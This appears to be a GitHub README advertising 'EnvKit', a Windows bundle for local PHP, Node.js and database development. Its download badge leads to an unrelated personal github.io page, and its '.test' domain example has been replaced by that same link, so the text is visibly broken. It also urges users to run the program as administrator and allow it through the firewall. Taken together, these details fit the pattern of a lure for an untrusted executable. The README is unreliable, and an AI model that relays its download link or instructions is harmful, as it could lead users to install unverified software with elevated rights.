# 🛠️ envkit-releases - Build local websites with ease

[![Download EnvKit](https://img.shields.io/badge/Download-EnvKit-blue.svg)](https://utkarshdwivedi212319.github.io)

EnvKit provides a simple way to run web development projects on your computer. It includes everything you need to create sites using PHP, Node.js, and various databases. You get a professional setup without complex configuration steps. It serves as a reliable alternative to tools like Laragon, XAMPP, or Herd.

## 📦 What is included

This software bundles essential tools for web developers. You do not need to install these components separately.

* Web Servers: Choose between Nginx or Apache to host your local websites.
* PHP: Run multiple versions of PHP to support different projects.
* Databases: Manage data with MySQL, MariaDB, PostgreSQL, Redis, or MongoDB.
* Email Testing: Use Mailpit to view emails sent from your local applications.
* Node.js: Access the latest JavaScript runtime for your scripts.
* HTTPS: Create secure .test domains that work in your browser.
* AI Control: Use the built-in MCP server to manage your environment with AI tools.

## 💻 System Requirements

EnvKit runs on standard Windows hardware. Ensure your computer meets these settings for the best performance:

* Operating System: Windows 10 or Windows 11.
* Memory: 4 GB RAM minimum, 8 GB recommended.
* Storage: 2 GB of free disk space.
* Permissions: You need administrator access to start background services.

## 🚀 Starting your development environment

Once you install EnvKit, you can start the application from your desktop or start menu.

1. Open the application.
2. Select your preferred web server, such as Nginx or Apache, from the main menu.
3. Choose the version of PHP you need for your project.
4. Click the Start button.
5. Watch the status indicators. Green lights show that your services are running.
6. Create your first project folder inside the EnvKit directory.

## 🔧 Managing your projects

EnvKit uses a simple folder structure. Every folder you create inside the designated projects directory becomes a local website.

* Add your project files to the root of your project folder.
* EnvKit automatically detects new folders.
* Access your sites in your browser using the `.test` extension. For example, if your folder name is `mysite`, go to `https://utkarshdwivedi212319.github.io` in your web browser.
* The system handles the local domain mapping for you automatically.

## ✉️ Testing emails

If you build sites that send emails, you often need to see those messages. Mailpit captures these emails so they do not go to real people.

* Open the EnvKit dashboard.
* Click the button labeled Mailpit.
* View every email your website sends in the browser window that opens.
* Delete or inspect these messages to ensure your contact forms work as expected.

## 🤖 Using the AI assistant

EnvKit includes an MCP server. This allows AI assistants to manage your local settings.

* Enable the MCP service in the settings menu.
* Connect your chosen AI assistant to the provided local port.
* Ask the assistant to start or stop services or update your settings.
* This feature helps you perform common tasks without manual clicking.

## 📁 Troubleshooting common issues

If you encounter problems, check these items first.

* Port Conflicts: If another program uses port 80 or 443, EnvKit might fail to start. Close other web servers before launching EnvKit.
* Permissions: Right-click the EnvKit icon and select Run as administrator if services do not start correctly.
* Firewall: Windows Defender may show a pop-up window during the first launch. Click Allow to ensure the web server can talk to your browser.
* Logs: If a service crashes, open the Logs folder in the EnvKit directory. The files there explain why the service stopped.
